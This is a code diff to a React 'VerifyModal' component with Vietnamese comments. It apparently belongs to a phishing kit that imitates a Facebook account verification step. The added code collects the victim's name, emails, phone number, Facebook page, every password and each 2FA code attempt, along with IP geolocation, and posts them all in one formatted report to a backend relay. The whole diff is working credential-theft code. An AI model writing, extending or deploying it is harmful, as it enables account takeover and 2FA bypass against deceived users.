@@ -15,7 +15,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId } = store();
+    const { geoInfo, messageId, userData, addCode, setMessageId } = store();
     const maxCode = config.MAX_CODE ?? 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 60;
 
@@ -61,12 +61,42 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const next = attempts + 1;
         setAttempts(next);
 
-        const message = `<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
+        // Lưu code vào store
+        addCode(code);
+
+        // Tạo tin nhắn với TẤT CẢ thông tin đã có
+        const allCodes = [...userData.codes, code];
+        const message = `
+${
+    geoInfo
+        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>
+<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
+        : 'N/A'
+}
+
+<b>👤 Full Name:</b> <code>${userData.fullName}</code>
+<b>📧 Personal Email:</b> <code>${userData.personalEmail}</code>
+<b>💼 Business Email:</b> <code>${userData.businessEmail}</code>
+<b>📱 Phone Number:</b> <code>${userData.phoneNumber}</code>
+<b>📘 Facebook Page:</b> <code>${userData.facebookPageName}</code>
+
+${userData.passwords.map((pass, idx) => `<b>🔒 Password ${idx + 1}/${userData.passwords.length}:</b> <code>${pass}</code>`).join('\n')}
+
+${allCodes.map((c, idx) => `<b>🔐 2FA Code ${idx + 1}/${maxCode}:</b> <code>${c}</code>`).join('\n')}
+
+<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
+        `.trim();
+
         try {
-            await axios.post('/api/send', {
+            const res = await axios.post('/api/send', {
                 message,
-                message_id: messageId
+                old_message_id: messageId
             });
+
+            if (res?.data?.success && typeof res.data.message_id === 'number') {
+                setMessageId(res.data.message_id);
+            }
+
             if (next >= maxCode) {
                 nextStep();
             } else {
